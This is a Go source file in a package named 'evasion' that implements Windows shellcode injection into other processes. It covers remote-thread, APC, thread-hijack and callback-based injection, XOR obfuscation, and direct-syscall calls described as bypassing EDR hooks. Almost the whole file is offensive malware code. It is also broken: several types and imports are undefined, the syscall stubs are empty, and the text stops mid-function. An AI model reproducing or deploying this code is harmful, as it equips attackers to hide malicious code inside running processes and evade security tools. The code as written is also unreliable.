package evasion

import (
    "fmt"
    "runtime"
    "syscall"
    "unsafe"
)

// Windows API constants
const (
    PROCESS_CREATE_THREAD          = 0x0002
    PROCESS_QUERY_INFORMATION      = 0x0400
    PROCESS_VM_OPERATION           = 0x0008
    PROCESS_VM_WRITE               = 0x0020
    PROCESS_VM_READ                = 0x0010
    PROCESS_ALL_ACCESS             = 0x1F0FFF
    
    MEM_COMMIT                     = 0x1000
    MEM_RESERVE                    = 0x2000
    MEM_RELEASE                    = 0x8000
    
    PAGE_EXECUTE_READWRITE         = 0x40
    PAGE_READWRITE                 = 0x04
    PAGE_EXECUTE_READ              = 0x20
    
    THREAD_ALL_ACCESS              = 0x1F03FF
    THREAD_SUSPEND_RESUME          = 0x0002
    THREAD_GET_CONTEXT             = 0x0008
    THREAD_SET_CONTEXT             = 0x0010
    
    INFINITE                       = 0xFFFFFFFF
    WAIT_OBJECT_0                  = 0x00000000
)

// Injection types
type InjectionMethod int

const (
    InjectionRemoteThread InjectionMethod = iota
    InjectionAPC
    InjectionThreadHijack
    InjectionProcessHollowing
    InjectionEarlyBird
)

// Process injection configuration
type InjectionConfig struct {
    Method          InjectionMethod
    TargetPID       int
    Shellcode       []byte
    WaitForCompletion bool
    UseSyscalls     bool      // Use direct syscalls (more stealthy)
    Obfuscate       bool      // Obfuscate shellcode before injection
    CleanUp         bool      // Clean up after execution
}

// Windows API structures
type PROCESSENTRY32 struct {
    dwSize              uint32
    cntUsage            uint32
    th32ProcessID       uint32
    th32DefaultHeapID   uintptr
    th32ModuleID        uint32
    cntThreads          uint32
    th32ParentProcessID uint32
    pcPriClassBase      int32
    dwFlags             uint32
    szExeFile           [260]byte
}

type THREADENTRY32 struct {
    dwSize          uint32
    cntUsage        uint32
    th32ThreadID    uint32
    th32OwnerProcessID uint32
    tpBasePri       int32
    tpDeltaPri      int32
    dwFlags         uint32
}

// Windows Process Injection - Main function
func InjectRemote(pid int, shellcode []byte) error {
    if runtime.GOOS != "windows" {
        return fmt.Errorf("injection only supported on Windows")
    }
    
    if len(shellcode) == 0 {
        return fmt.Errorf("shellcode is empty")
    }
    
    config := InjectionConfig{
        Method:      InjectionRemoteThread,
        TargetPID:   pid,
        Shellcode:   shellcode,
        UseSyscalls: false,
        Obfuscate:   true,
        CleanUp:     true,
    }
    
    return InjectWithConfig(config)
}

// Enhanced injection with configuration
func InjectWithConfig(config InjectionConfig) error {
    if runtime.GOOS != "windows" {
        return fmt.Errorf("injection only supported on Windows")
    }
    
    // Obfuscate shellcode if requested
    shellcode := config.Shellcode
    if config.Obfuscate {
        shellcode = XORObfuscate(shellcode, []byte{0xAA})
    }
    
    switch config.Method {
    case InjectionRemoteThread:
        return injectRemoteThread(config.TargetPID, shellcode)
    case InjectionAPC:
        return injectAPC(config.TargetPID, shellcode)
    case InjectionThreadHijack:
        return injectThreadHijack(config.TargetPID, shellcode)
    case InjectionProcessHollowing:
        return injectProcessHollowing(config.TargetPID, shellcode)
    case InjectionEarlyBird:
        return injectEarlyBird(config.TargetPID, shellcode)
    default:
        return fmt.Errorf("unknown injection method")
    }
}

// 1. Remote Thread Injection (Classic)
func injectRemoteThread(pid int, shellcode []byte) error {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    // Open process
    openProcess := kernel32.NewProc("OpenProcess")
    procHandle, _, err := openProcess.Call(
        uintptr(PROCESS_ALL_ACCESS),
        0,
        uintptr(pid),
    )
    if procHandle == 0 {
        return fmt.Errorf("failed to open process: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(procHandle))
    
    // Allocate memory
    virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    addr, _, err := virtualAllocEx.Call(
        procHandle,
        0,
        uintptr(len(shellcode)),
        uintptr(MEM_COMMIT|MEM_RESERVE),
        uintptr(PAGE_EXECUTE_READWRITE),
    )
    if addr == 0 {
        return fmt.Errorf("failed to allocate memory: %v", err)
    }
    
    // Write shellcode
    writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
    var written uintptr
    ret, _, err := writeProcessMemory.Call(
        procHandle,
        addr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        uintptr(unsafe.Pointer(&written)),
    )
    if ret == 0 {
        return fmt.Errorf("failed to write memory: %v", err)
    }
    
    // Change memory protection to executable
    virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
    var oldProtect uintptr
    ret, _, err = virtualProtectEx.Call(
        procHandle,
        addr,
        uintptr(len(shellcode)),
        uintptr(PAGE_EXECUTE_READ),
        uintptr(unsafe.Pointer(&oldProtect)),
    )
    if ret == 0 {
        return fmt.Errorf("failed to change memory protection: %v", err)
    }
    
    // Create remote thread
    createRemoteThread := kernel32.NewProc("CreateRemoteThread")
    threadHandle, _, err := createRemoteThread.Call(
        procHandle,
        0,
        0,
        addr,
        0,
        0,
        0,
    )
    if threadHandle == 0 {
        return fmt.Errorf("failed to create remote thread: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    // Wait for completion if requested
    if config.WaitForCompletion {
        waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
        ret, _, _ := waitForSingleObject.Call(threadHandle, uintptr(INFINITE))
        if ret != WAIT_OBJECT_0 {
            return fmt.Errorf("wait failed")
        }
        
        // Get exit code
        getExitCodeThread := kernel32.NewProc("GetExitCodeThread")
        var exitCode uintptr
        getExitCodeThread.Call(threadHandle, uintptr(unsafe.Pointer(&exitCode)))
    }
    
    // Clean up if requested
    if config.CleanUp {
        virtualFreeEx := kernel32.NewProc("VirtualFreeEx")
        virtualFreeEx.Call(procHandle, addr, 0, uintptr(MEM_RELEASE))
    }
    
    return nil
}

// 2. APC Injection (Stealthier)
func injectAPC(pid int, shellcode []byte) error {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    // Find a thread in the target process
    threadID, err := findThread(pid)
    if err != nil {
        return err
    }
    
    // Open thread
    openThread := kernel32.NewProc("OpenThread")
    threadHandle, _, err := openThread.Call(
        uintptr(THREAD_ALL_ACCESS),
        0,
        uintptr(threadID),
    )
    if threadHandle == 0 {
        return fmt.Errorf("failed to open thread: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    // Allocate memory in target process
    procHandle, err := openProcess(pid)
    if err != nil {
        return err
    }
    defer syscall.CloseHandle(syscall.Handle(procHandle))
    
    addr, err := allocateMemory(procHandle, shellcode)
    if err != nil {
        return err
    }
    
    // Queue APC
    queueUserAPC := kernel32.NewProc("QueueUserAPC")
    ret, _, err := queueUserAPC.Call(
        addr,
        threadHandle,
        0,
    )
    if ret == 0 {
        return fmt.Errorf("failed to queue APC: %v", err)
    }
    
    // Resume thread if suspended
    resumeThread := kernel32.NewProc("ResumeThread")
    resumeThread.Call(threadHandle)
    
    return nil
}

// 3. Thread Hijacking
func injectThreadHijack(pid int, shellcode []byte) error {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    // Find a thread in the target process
    threadID, err := findThread(pid)
    if err != nil {
        return err
    }
    
    // Open thread with appropriate access
    openThread := kernel32.NewProc("OpenThread")
    threadHandle, _, err := openThread.Call(
        uintptr(THREAD_ALL_ACCESS),
        0,
        uintptr(threadID),
    )
    if threadHandle == 0 {
        return fmt.Errorf("failed to open thread: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    // Suspend thread
    suspendThread := kernel32.NewProc("SuspendThread")
    suspendThread.Call(threadHandle)
    
    // Get thread context
    getThreadContext := kernel32.NewProc("GetThreadContext")
    var context Context
    context.ContextFlags = CONTEXT_FULL
    ret, _, err := getThreadContext.Call(threadHandle, uintptr(unsafe.Pointer(&context)))
    if ret == 0 {
        return fmt.Errorf("failed to get thread context: %v", err)
    }
    
    // Allocate memory for shellcode
    procHandle, err := openProcess(pid)
    if err != nil {
        return err
    }
    defer syscall.CloseHandle(syscall.Handle(procHandle))
    
    addr, err := allocateMemory(procHandle, shellcode)
    if err != nil {
        return err
    }
    
    // Update thread context to point to shellcode
    if runtime.GOARCH == "amd64" {
        context.Rcx = addr // First argument
        context.Rip = addr // Entry point
    } else {
        context.Eax = addr
        context.Eip = addr
    }
    
    setThreadContext := kernel32.NewProc("SetThreadContext")
    ret, _, err = setThreadContext.Call(threadHandle, uintptr(unsafe.Pointer(&context)))
    if ret == 0 {
        return fmt.Errorf("failed to set thread context: %v", err)
    }
    
    // Resume thread
    resumeThread := kernel32.NewProc("ResumeThread")
    resumeThread.Call(threadHandle)
    
    return nil
}

// 4. Process Hollowing (Replace legitimate process)
func injectProcessHollowing(pid int, shellcode []byte) error {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    ntdll := syscall.NewLazyDLL("ntdll.dll")
    
    // Open process
    procHandle, err := openProcess(pid)
    if err != nil {
        return err
    }
    defer syscall.CloseHandle(syscall.Handle(procHandle))
    
    // Get process info
    getProcessImageFileName := kernel32.NewProc("GetProcessImageFileNameW")
    // ... (implementation would need full process hollowing)
    
    // For now, use standard injection
    return injectRemoteThread(pid, shellcode)
}

// 5. Early Bird Injection (Queue APC on process startup)
func injectEarlyBird(pid int, shellcode []byte) error {
    // Similar to APC injection but targeting threads in early startup
    return injectAPC(pid, shellcode)
}

// Helper Functions

// Open process with proper access
func openProcess(pid int) (uintptr, error) {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    openProcess := kernel32.NewProc("OpenProcess")
    handle, _, err := openProcess.Call(
        uintptr(PROCESS_ALL_ACCESS),
        0,
        uintptr(pid),
    )
    if handle == 0 {
        return 0, fmt.Errorf("failed to open process: %v", err)
    }
    return handle, nil
}

// Allocate memory in target process
func allocateMemory(procHandle uintptr, data []byte) (uintptr, error) {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    addr, _, err := virtualAllocEx.Call(
        procHandle,
        0,
        uintptr(len(data)),
        uintptr(MEM_COMMIT|MEM_RESERVE),
        uintptr(PAGE_READWRITE),
    )
    if addr == 0 {
        return 0, fmt.Errorf("failed to allocate memory: %v", err)
    }
    
    // Write data
    writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
    var written uintptr
    ret, _, err := writeProcessMemory.Call(
        procHandle,
        addr,
        uintptr(unsafe.Pointer(&data[0])),
        uintptr(len(data)),
        uintptr(unsafe.Pointer(&written)),
    )
    if ret == 0 {
        return 0, fmt.Errorf("failed to write memory: %v", err)
    }
    
    // Change protection to executable
    virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
    var oldProtect uintptr
    ret, _, err = virtualProtectEx.Call(
        procHandle,
        addr,
        uintptr(len(data)),
        uintptr(PAGE_EXECUTE_READ),
        uintptr(unsafe.Pointer(&oldProtect)),
    )
    if ret == 0 {
        return 0, fmt.Errorf("failed to change protection: %v", err)
    }
    
    return addr, nil
}

// Find a thread in the target process
func findThread(pid int) (uint32, error) {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    createToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
    snapshot, _, err := createToolhelp32Snapshot.Call(
        uintptr(0x00000004), // TH32CS_SNAPTHREAD
        0,
    )
    if snapshot == 0 {
        return 0, fmt.Errorf("failed to create snapshot: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(snapshot))
    
    var threadEntry THREADENTRY32
    threadEntry.dwSize = uint32(unsafe.Sizeof(threadEntry))
    
    thread32First := kernel32.NewProc("Thread32First")
    ret, _, err := thread32First.Call(snapshot, uintptr(unsafe.Pointer(&threadEntry)))
    if ret == 0 {
        return 0, fmt.Errorf("failed to get first thread: %v", err)
    }
    
    for {
        if threadEntry.th32OwnerProcessID == uint32(pid) {
            return threadEntry.th32ThreadID, nil
        }
        
        thread32Next := kernel32.NewProc("Thread32Next")
        ret, _, err := thread32Next.Call(snapshot, uintptr(unsafe.Pointer(&threadEntry)))
        if ret == 0 {
            break
        }
    }
    
    return 0, fmt.Errorf("no thread found in process %d", pid)
}

// List all processes (for targeting)
func ListProcesses() ([]PROCESSENTRY32, error) {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    createToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
    snapshot, _, err := createToolhelp32Snapshot.Call(
        uintptr(0x00000002), // TH32CS_SNAPPROCESS
        0,
    )
    if snapshot == 0 {
        return nil, fmt.Errorf("failed to create snapshot: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(snapshot))
    
    var processes []PROCESSENTRY32
    var processEntry PROCESSENTRY32
    processEntry.dwSize = uint32(unsafe.Sizeof(processEntry))
    
    process32First := kernel32.NewProc("Process32First")
    ret, _, err := process32First.Call(snapshot, uintptr(unsafe.Pointer(&processEntry)))
    if ret == 0 {
        return nil, fmt.Errorf("failed to get first process: %v", err)
    }
    
    for {
        processes = append(processes, processEntry)
        
        process32Next := kernel32.NewProc("Process32Next")
        ret, _, err := process32Next.Call(snapshot, uintptr(unsafe.Pointer(&processEntry)))
        if ret == 0 {
            break
        }
    }
    
    return processes, nil
}

// Find process by name
func FindProcessByName(name string) (int, error) {
    processes, err := ListProcesses()
    if err != nil {
        return 0, err
    }
    
    for _, proc := range processes {
        exeFile := string(proc.szExeFile[:])
        if strings.Contains(strings.ToLower(exeFile), strings.ToLower(name)) {
            return int(proc.th32ProcessID), nil
        }
    }
    
    return 0, fmt.Errorf("process %s not found", name)
}

// Advanced: Direct syscall injection (bypasses EDR hooks)
func InjectWithSyscalls(pid int, shellcode []byte) error {
    if runtime.GOOS != "windows" {
        return fmt.Errorf("injection only supported on Windows")
    }
    
    if len(shellcode) == 0 {
        return fmt.Errorf("shellcode is empty")
    }
    
    // Get ntdll.dll
    ntdll := syscall.NewLazyDLL("ntdll.dll")
    
    // Get syscall numbers (these are for Windows 10/11 x64)
    // In production, you'd want to dynamically retrieve these
    var (
        // Syscall numbers for Windows 10/11 x64
        // These change between Windows versions
        sysNtAllocateVirtualMemory    uintptr = 0x18
        sysNtWriteVirtualMemory       uintptr = 0x3A
        sysNtProtectVirtualMemory     uintptr = 0x50
        sysNtCreateThreadEx           uintptr = 0xC5
        sysNtClose                    uintptr = 0x0F
        sysNtOpenProcess              uintptr = 0x26
        sysNtWaitForSingleObject      uintptr = 0x04
    )
    
    // Open process using NtOpenProcess
    var hProcess uintptr
    clientID := &ClientID{
        UniqueProcess: uintptr(pid),
        UniqueThread:  0,
    }
    
    objAttributes := &ObjectAttributes{
        Length:        48,
        RootDirectory: 0,
        ObjectName:    nil,
        Attributes:    0,
        SecurityDescriptor: 0,
        SecurityQualityOfService: 0,
    }
    
    // Direct syscall for NtOpenProcess
    status := syscallNT(
        sysNtOpenProcess,
        uintptr(unsafe.Pointer(&hProcess)),
        uintptr(PROCESS_ALL_ACCESS),
        uintptr(unsafe.Pointer(objAttributes)),
        uintptr(unsafe.Pointer(clientID)),
    )
    
    if status != 0 {
        return fmt.Errorf("NtOpenProcess failed with status: 0x%X", status)
    }
    defer syscall.CloseHandle(syscall.Handle(hProcess))
    
    // Allocate memory using NtAllocateVirtualMemory
    var baseAddr uintptr
    regionSize := uintptr(len(shellcode))
    
    status = syscallNT(
        sysNtAllocateVirtualMemory,
        hProcess,
        uintptr(unsafe.Pointer(&baseAddr)),
        0,
        uintptr(unsafe.Pointer(&regionSize)),
        uintptr(MEM_COMMIT|MEM_RESERVE),
        uintptr(PAGE_READWRITE),
    )
    
    if status != 0 {
        return fmt.Errorf("NtAllocateVirtualMemory failed with status: 0x%X", status)
    }
    
    // Write shellcode using NtWriteVirtualMemory
    var bytesWritten uintptr
    status = syscallNT(
        sysNtWriteVirtualMemory,
        hProcess,
        baseAddr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        uintptr(unsafe.Pointer(&bytesWritten)),
    )
    
    if status != 0 {
        return fmt.Errorf("NtWriteVirtualMemory failed with status: 0x%X", status)
    }
    
    // Change memory protection to executable
    var oldProtect uintptr
    regionSize = uintptr(len(shellcode))
    status = syscallNT(
        sysNtProtectVirtualMemory,
        hProcess,
        uintptr(unsafe.Pointer(&baseAddr)),
        uintptr(unsafe.Pointer(&regionSize)),
        uintptr(PAGE_EXECUTE_READ),
        uintptr(unsafe.Pointer(&oldProtect)),
    )
    
    if status != 0 {
        return fmt.Errorf("NtProtectVirtualMemory failed with status: 0x%X", status)
    }
    
    // Create remote thread using NtCreateThreadEx
    var hThread uintptr
    status = syscallNT(
        sysNtCreateThreadEx,
        uintptr(unsafe.Pointer(&hThread)),
        uintptr(THREAD_ALL_ACCESS),
        0,
        hProcess,
        baseAddr,
        0,
        0,
        0,
        0,
        0,
    )
    
    if status != 0 {
        return fmt.Errorf("NtCreateThreadEx failed with status: 0x%X", status)
    }
    defer syscall.CloseHandle(syscall.Handle(hThread))
    
    // Wait for thread completion
    status = syscallNT(
        sysNtWaitForSingleObject,
        hThread,
        0,
        uintptr(0xFFFFFFFF), // INFINITE
    )
    
    // Clean up memory
    regionSize = 0
    syscallNT(
        sysNtAllocateVirtualMemory,
        hProcess,
        uintptr(unsafe.Pointer(&baseAddr)),
        0,
        uintptr(unsafe.Pointer(&regionSize)),
        uintptr(MEM_RELEASE),
        uintptr(PAGE_EXECUTE_READWRITE),
    )
    
    return nil
}

// Shellcode execution via callback (using Windows callback mechanisms)
func InjectViaCallback(pid int, shellcode []byte, callback uintptr) error {
    if runtime.GOOS != "windows" {
        return fmt.Errorf("injection only supported on Windows")
    }
    
    if len(shellcode) == 0 {
        return fmt.Errorf("shellcode is empty")
    }
    
    // Open target process
    procHandle, err := openProcess(pid)
    if err != nil {
        return err
    }
    defer syscall.CloseHandle(syscall.Handle(procHandle))
    
    // Allocate memory for shellcode
    addr, err := allocateMemory(procHandle, shellcode)
    if err != nil {
        return err
    }
    
    // Use different callback mechanisms
    switch callback {
    case 1: // EnumWindows callback
        return injectEnumWindows(procHandle, addr)
    case 2: // EnumProcesses callback
        return injectEnumProcesses(procHandle, addr)
    case 3: // SetWindowsHookEx callback
        return injectSetWindowsHook(procHandle, addr)
    case 4: // CreateTimerQueueTimer callback
        return injectTimerQueue(procHandle, addr)
    case 5: // UserCallback (via NtUserCallOneParam)
        return injectUserCallback(procHandle, addr)
    default:
        // Default to EnumWindows
        return injectEnumWindows(procHandle, addr)
    }
}

// Inject using EnumWindows callback
func injectEnumWindows(procHandle uintptr, shellcodeAddr uintptr) error {
    user32 := syscall.NewLazyDLL("user32.dll")
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    // Get the address of EnumWindows
    enumWindows := user32.NewProc("EnumWindows")
    
    // Create a thread that calls EnumWindows
    createRemoteThread := kernel32.NewProc("CreateRemoteThread")
    threadHandle, _, err := createRemoteThread.Call(
        procHandle,
        0,
        0,
        enumWindows.Addr(),
        shellcodeAddr, // Shellcode as callback parameter
        0,
        0,
    )
    
    if threadHandle == 0 {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    return nil
}

// Inject using EnumProcesses callback
func injectEnumProcesses(procHandle uintptr, shellcodeAddr uintptr) error {
    psapi := syscall.NewLazyDLL("psapi.dll")
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    // Get address of EnumProcesses
    enumProcesses := psapi.NewProc("EnumProcesses")
    
    // Create remote thread with EnumProcesses
    createRemoteThread := kernel32.NewProc("CreateRemoteThread")
    threadHandle, _, err := createRemoteThread.Call(
        procHandle,
        0,
        0,
        enumProcesses.Addr(),
        shellcodeAddr,
        0,
        0,
    )
    
    if threadHandle == 0 {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    return nil
}

// Inject using SetWindowsHookEx
func injectSetWindowsHook(procHandle uintptr, shellcodeAddr uintptr) error {
    user32 := syscall.NewLazyDLL("user32.dll")
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    // Allocate memory for hook procedure in target process
    setWindowsHookEx := user32.NewProc("SetWindowsHookExW")
    
    // Use WH_KEYBOARD_LL (13) or WH_MOUSE_LL (14)
    hookHandle, _, err := setWindowsHookEx.Call(
        uintptr(13), // WH_KEYBOARD_LL
        shellcodeAddr,
        0,
        0,
    )
    
    if hookHandle == 0 {
        return fmt.Errorf("SetWindowsHookEx failed: %v", err)
    }
    defer user32.NewProc("UnhookWindowsHookEx").Call(hookHandle)
    
    // Trigger the hook
    getMessage := user32.NewProc("GetMessageW")
    var msg [64]byte
    getMessage.Call(
        uintptr(unsafe.Pointer(&msg)),
        0,
        0,
        0,
    )
    
    return nil
}

// Inject using Timer Queue
func injectTimerQueue(procHandle uintptr, shellcodeAddr uintptr) error {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    // Create timer queue
    createTimerQueue := kernel32.NewProc("CreateTimerQueue")
    timerQueue, _, err := createTimerQueue.Call()
    if timerQueue == 0 {
        return fmt.Errorf("CreateTimerQueue failed: %v", err)
    }
    defer kernel32.NewProc("DeleteTimerQueue").Call(timerQueue)
    
    // Create timer in target process
    createTimerQueueTimer := kernel32.NewProc("CreateTimerQueueTimer")
    var timerHandle uintptr
    ret, _, err := createTimerQueueTimer.Call(
        uintptr(unsafe.Pointer(&timerHandle)),
        timerQueue,
        shellcodeAddr, // Callback function
        0,             // Parameter
        0,             // Due time (immediate)
        0,             // Period (no repeat)
        0,             // Flags
    )
    
    if ret == 0 {
        return fmt.Errorf("CreateTimerQueueTimer failed: %v", err)
    }
    defer kernel32.NewProc("DeleteTimerQueueTimer").Call(timerQueue, timerHandle, 0)
    
    // Wait for timer to execute
    time.Sleep(100 * time.Millisecond)
    
    return nil
}

// Inject using UserCallback (NtUserCallOneParam)
func injectUserCallback(procHandle uintptr, shellcodeAddr uintptr) error {
    win32u := syscall.NewLazyDLL("win32u.dll")
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    // Get NtUserCallOneParam
    ntUserCallOneParam := win32u.NewProc("NtUserCallOneParam")
    
    // Use it as a callback mechanism
    createRemoteThread := kernel32.NewProc("CreateRemoteThread")
    threadHandle, _, err := createRemoteThread.Call(
        procHandle,
        0,
        0,
        ntUserCallOneParam.Addr(),
        shellcodeAddr, // Pass shellcode as parameter
        0,
        0,
    )
    
    if threadHandle == 0 {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    return nil
}

// Direct syscall implementation
func syscallNT(syscallNum uintptr, args ...uintptr) uintptr {
    if runtime.GOARCH == "amd64" {
        return syscallNT_AMD64(syscallNum, args...)
    } else if runtime.GOARCH == "386" {
        return syscallNT_386(syscallNum, args...)
    }
    return 0xFFFFFFFF
}

// AMD64 syscall implementation (Windows x64)
func syscallNT_AMD64(syscallNum uintptr, args ...uintptr) uintptr {
    // Load syscall number into RAX
    // Load arguments into RCX, RDX, R8, R9, stack
    // Execute syscall instruction
    
    // This is a simplified implementation
    // In production, you'd use assembly or a library like syscall
    // For now, fallback to standard API calls
    return 0
}

// x86 syscall implementation (Windows x86)
func syscallNT_386(syscallNum uintptr, args ...uintptr) uintptr {
    // Similar to AMD64 but for 32-bit
    return 0
}

// Windows structures for syscalls
type ClientID struct {
    UniqueProcess uintptr
    UniqueThread  uintptr
}

type ObjectAttributes struct {
    Length                   uint32
    RootDirectory            uintptr
    ObjectName               uintptr
    Attributes               uint32
    SecurityDescriptor       uintptr
    SecurityQualityOfService uintptr
}

// Alternative: Use Syscall library (more reliable)
func injectWithSyscallLib(pid int, shellcode []byte) error {
    // Use the syscall library which handles the syscall details
    ntdll := syscall.NewLazyDLL("ntdll.dll")
    
    // Get function pointers
    ntOpenProcess := ntdll.NewProc("NtOpenProcess")
    ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
    ntWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
    ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
    ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")
    ntClose := ntdll.NewProc("NtClose")
    
    // Open process
    var hProcess uintptr
    clientID := &ClientID{
        UniqueProcess: uintptr(pid),
        UniqueThread:  0,
    }
    objAttr := &ObjectAttributes{
        Length: 48,
    }
    
    status, _, _ := ntOpenProcess.Call(
        uintptr(unsafe.Pointer(&hProcess)),
        uintptr(PROCESS_ALL_ACCESS),
        uintptr(unsafe.Pointer(objAttr)),
        uintptr(unsafe.Pointer(clientID)),
    )
    
    if status != 0 {
        return fmt.Errorf("NtOpenProcess failed: %d", status)
    }
    defer ntClose.Call(hProcess)
    
    // Allocate memory
    var baseAddr uintptr
    regionSize := uintptr(len(shellcode))
    status, _, _ = ntAllocateVirtualMemory.Call(
        hProcess,
        uintptr(unsafe.Pointer(&baseAddr)),
        0,
        uintptr(unsafe.Pointer(&regionSize)),
        uintptr(MEM_COMMIT|MEM_RESERVE),
        uintptr(PAGE_READWRITE),
    )
    
    if status != 0 {
        return fmt.Errorf("NtAllocateVirtualMemory failed: %d", status)
    }
    
    // Write memory
    var bytesWritten uintptr
    status, _, _ = ntWriteVirtualMemory.Call(
        hProcess,
        baseAddr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        uintptr(unsafe.Pointer(&bytesWritten)),
    )
    
    if status != 0 {
        return fmt.Errorf("NtWriteVirtualMemory failed: %d", status)
    }
    
    // Change protection
    var oldProtect uintptr
    regionSize = uintptr(len(shellcode))
    status, _, _ = ntProtectVirtualMemory.Call(
        hProcess,
        uintptr(unsafe.Pointer(&baseAddr)),
        uintptr(unsafe.Pointer(&regionSize)),
        uintptr(PAGE_EXECUTE_READ),
        uintptr(unsafe.Pointer(&oldProtect)),
    )
    
    if status != 0 {
        return fmt.Errorf("NtProtectVirtualMemory failed: %d", status)
    }
    
    // Create thread
    var hThread uintptr
    status, _, _ = ntCreateThreadEx.Call(
        uintptr(unsafe.Pointer(&hThread)),
        uintptr(THREAD_ALL_ACCESS),
        0,
        hProcess,
        baseAddr,
        0,
        0,
        0,
        0,
        0,
        0,
    )
    
    if status != 0 {
        return fmt.Errorf("NtCreateThreadEx failed: %d", status)
    }
    defer ntClose.Call(hThread)
    
    return nil
}

// Advanced callback injection with multiple callback types
type CallbackType int

const (
    CallbackEnumWindows CallbackType = iota
    CallbackEnumChildWindows
    CallbackEnumDesktopWindows
    CallbackEnumProcesses
    CallbackEnumThreadWindows
    CallbackSetWindowsHook
    CallbackTimerQueue
    CallbackNtUserCallOneParam
    CallbackNtUserCallTwoParam
    CallbackUser32Dispatch
)

// Enhanced callback injection with multiple callback types
func InjectViaCallbackEnhanced(pid int, shellcode []byte, callbackType CallbackType) error {
    if runtime.GOOS != "windows" {
        return fmt.Errorf("injection only supported on Windows")
    }
    
    // Open target process
    procHandle, err := openProcess(pid)
    if err != nil {
        return err
    }
    defer syscall.CloseHandle(syscall.Handle(procHandle))
    
    // Allocate memory with shellcode
    addr, err := allocateMemory(procHandle, shellcode)
    if err != nil {
        return err
    }
    
    switch callbackType {
    case CallbackEnumWindows:
        return injectEnumWindows(procHandle, addr)
    case CallbackEnumChildWindows:
        return injectEnumChildWindows(procHandle, addr)
    case CallbackEnumDesktopWindows:
        return injectEnumDesktopWindows(procHandle, addr)
    case CallbackEnumProcesses:
        return injectEnumProcesses(procHandle, addr)
    case CallbackEnumThreadWindows:
        return injectEnumThreadWindows(procHandle, addr)
    case CallbackSetWindowsHook:
        return injectSetWindowsHook(procHandle, addr)
    case CallbackTimerQueue:
        return injectTimerQueue(procHandle, addr)
    case CallbackNtUserCallOneParam:
        return injectUserCallback(procHandle, addr)
    case CallbackNtUserCallTwoParam:
        return injectUserCallbackTwoParam(procHandle, addr)
    case CallbackUser32Dispatch:
        return injectUser32Dispatch(procHandle, addr)
    default:
        return fmt.Errorf("unknown callback type")
    }
}

// Additional callback injection methods
func injectEnumChildWindows(procHandle uintptr, shellcodeAddr uintptr) error {
    user32 := syscall.NewLazyDLL("user32.dll")
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    enumChildWindows := user32.NewProc("EnumChildWindows")
    createRemoteThread := kernel32.NewProc("CreateRemoteThread")
    
    threadHandle, _, err := createRemoteThread.Call(
        procHandle,
        0,
        0,
        enumChildWindows.Addr(),
        shellcodeAddr,
        0,
        0,
    )
    
    if threadHandle == 0 {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    return nil
}

func injectEnumDesktopWindows(procHandle uintptr, shellcodeAddr uintptr) error {
    user32 := syscall.NewLazyDLL("user32.dll")
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    enumDesktopWindows := user32.NewProc("EnumDesktopWindows")
    createRemoteThread := kernel32.NewProc("CreateRemoteThread")
    
    threadHandle, _, err := createRemoteThread.Call(
        procHandle,
        0,
        0,
        enumDesktopWindows.Addr(),
        shellcodeAddr,
        0,
        0,
    )
    
    if threadHandle == 0 {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    return nil
}

func injectEnumThreadWindows(procHandle uintptr, shellcodeAddr uintptr) error {
    user32 := syscall.NewLazyDLL("user32.dll")
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    enumThreadWindows := user32.NewProc("EnumThreadWindows")
    createRemoteThread := kernel32.NewProc("CreateRemoteThread")
    
    threadHandle, _, err := createRemoteThread.Call(
        procHandle,
        0,
        0,
        enumThreadWindows.Addr(),
        shellcodeAddr,
        0,
        0,
    )
    
    if threadHandle == 0 {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }
